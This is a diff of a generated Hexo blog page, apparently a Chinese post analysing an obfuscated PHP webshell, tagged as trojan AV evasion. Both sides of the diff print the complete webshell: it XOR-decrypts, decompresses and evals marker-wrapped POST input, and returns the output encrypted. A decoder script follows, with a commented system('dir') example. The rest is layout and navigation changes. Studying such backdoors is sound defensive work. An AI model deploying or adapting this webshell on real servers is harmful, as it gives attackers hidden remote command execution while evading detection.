@@ -437,15 +437,15 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 是否加载使用自带的 prismjs.
-        <link rel="stylesheet" href="/libs/prism/prism.min.css"> -->
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
 
-        <!-- 
-         -->
 
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h4 id="1-webshell-混淆"><a href="#1-webshell-混淆" class="headerlink" title="1. webshell 混淆"></a>1. webshell 混淆</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;161ebd7d&quot;</span>;<span class="variable">$kh</span>=<span class="string">&quot;45089b3446ee&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;4e0d86dbcf92&quot;</span>;<span class="variable">$p</span>=<span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment"># $t 是base64解码后的内容 </span></span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	循环的大致意思是我们采用 无论是输入的$t,还是自定义的$k。无论谁比谁长还是短。用户输入的$t必须要遍历完，如果$k不够那就从头开始。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>,@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>),<span class="variable">$m</span>)==<span class="number">1</span>) &#123;</span><br><span class="line">	@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	ob_start(): 该函数开启输出缓冲。默认情况下，PHP 会将所有输出直接发送到浏览器。但当开启输出缓冲后，PHP 会将输出存储在内存中，而不是立刻发送到浏览器。只有在缓冲区被清空或者脚本执行结束时，输出才会被发送给浏览器。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	@<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]),<span class="variable">$k</span>)));</span><br><span class="line">	<span class="comment"># gzuncompress 是一种解压缩函数 </span></span><br><span class="line">	<span class="variable">$o</span>=@<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">	@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">	<span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
+
+                <div class="card-content article-card-content">
+                    <div id="articleContent">
+                        <h4 id="1-webshell-混淆"><a href="#1-webshell-混淆" class="headerlink" title="1. webshell 混淆"></a>1. webshell 混淆</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span>=<span class="string">&quot;161ebd7d&quot;</span>;<span class="variable">$kh</span>=<span class="string">&quot;45089b3446ee&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;4e0d86dbcf92&quot;</span>;<span class="variable">$p</span>=<span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">	<span class="comment"># $t 是base64解码后的内容 </span></span><br><span class="line">	<span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$o</span>.=<span class="variable">$t</span>[<span class="variable">$i</span>]^<span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	循环的大致意思是我们采用 无论是输入的$t,还是自定义的$k。无论谁比谁长还是短。用户输入的$t必须要遍历完，如果$k不够那就从头开始。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (@<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>,@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>),<span class="variable">$m</span>)==<span class="number">1</span>) &#123;</span><br><span class="line">	@<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	ob_start(): 该函数开启输出缓冲。默认情况下，PHP 会将所有输出直接发送到浏览器。但当开启输出缓冲后，PHP 会将输出存储在内存中，而不是立刻发送到浏览器。只有在缓冲区被清空或者脚本执行结束时，输出才会被发送给浏览器。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	@<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$m</span>[<span class="number">1</span>]),<span class="variable">$k</span>)));</span><br><span class="line">	<span class="comment"># gzuncompress 是一种解压缩函数 </span></span><br><span class="line">	<span class="variable">$o</span>=@<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">	@<span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">	<span class="variable">$r</span>=@<span class="title function_ invoke__">base64_encode</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$p</span><span class="subst">$kh</span><span class="subst">$r</span><span class="subst">$kf</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>唯一一个无法确定的就是preg_match中的$m变量。一般来讲，这就是保存捕获的字符串。</p>
 <ul>
@@ -464,11 +464,11 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;161ebd7d&quot;</span>;</span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;45089b3446ee&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;4e0d86dbcf92&quot;</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;lFDu8RwONqmag5ex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># $t 是base64解码后的内容 </span></span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>; ) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span> .= <span class="variable">$t</span>[<span class="variable">$i</span>] ^ <span class="variable">$k</span>[<span class="variable">$j</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       循环的大致意思是我们采用 无论是输入的$t,还是自定义的$k。无论谁比谁长还是短。用户输入的$t必须要遍历完，如果$k不够那就从头开始。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;r&#x27;</span>]), <span class="variable">$k</span>));</span><br><span class="line"><span class="comment">// $o = &quot;system(&#x27;dir&#x27;);&quot;;</span></span><br><span class="line"><span class="comment">// $r = @base64_encode(@x(@gzcompress($o), $k));</span></span><br><span class="line"><span class="comment">// echo $r;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250119224604.png" alt="image.png"></p>
 
-                    
-            </div>
-            <hr />
+                            
+                    </div>
+                    <hr />
 
-            
+                    
 
     <div class="reprint" id="reprint-statement">
         
@@ -522,23 +522,23 @@
 
 
 
-                <div class="tag_share" style="display: block;">
-                    <div class="post-meta__tag-list" style="display: inline-block;">
-                        
-                            <div class="article-tag">
+                        <div class="tag_share" style="display: block;">
+                            <div class="post-meta__tag-list" style="display: inline-block;">
                                 
-                                    <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">
-                                        <span class="chip bg-color">
-                                            木马免杀
-                                        </span>
-                                    </a>
+                                    <div class="article-tag">
+                                        
+                                            <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">
+                                                <span class="chip bg-color">
+                                                    木马免杀
+                                                </span>
+                                            </a>
+                                            
+                                    </div>
                                     
                             </div>
-                            
-                    </div>
-                    <div class="post_share"
-                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+                            <div class="post_share"
+                                style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
@@ -550,10 +550,10 @@
 
 </div>
 
-                    </div>
+                            </div>
+                        </div>
+                        
                 </div>
-                
-        </div>
     </div>
 
     
@@ -577,17 +577,16 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2025/01/19/%E4%B8%80%E6%AC%A1%E6%B7%B7%E6%B7%86webshell%E5%88%86%E6%9E%90/">
+                <a href="/2025/01/23/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250119224702.png" class="responsive-img" alt="一次混淆webshell分析">
+                        <img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250123213421.png" class="responsive-img" alt="hexo博客搭建">
                         
-                        <span class="card-title">一次混淆webshell分析</span>
+                        <span class="card-title">hexo博客搭建</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -597,27 +596,26 @@
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-19
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-23
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/" class="post-category">
-                                    木马免杀
+                            <a href="/categories/%E6%97%A5%E5%B8%B8%E5%A8%B1%E4%B9%90/" class="post-category">
+                                    日常娱乐
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80/">
-                        <span class="chip bg-color">木马免杀</span>
+                    <a href="/tags/%E6%97%A5%E5%B8%B8%E5%A8%B1%E4%B9%90/">
+                        <span class="chip bg-color">日常娱乐</span>
                     </a>
                     
                 </div>
@@ -684,20 +682,23 @@
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+  
 
-<!-- 代码语言 -->
+    <!-- 代码语言 -->
+    
 
+        <!-- 代码块复制 -->
+        
+          <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+          
 
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
+            <!-- 代码块收缩 -->
+            
+              <script type="text/javascript"
+                src="/libs/codeBlock/codeShrink.js"></script>
+              
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
         <div class="toc-widget card" style="background-color: white;">
@@ -803,7 +804,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">125.3k</span>
+                        class="white-color">125.5k</span>
             
             
             
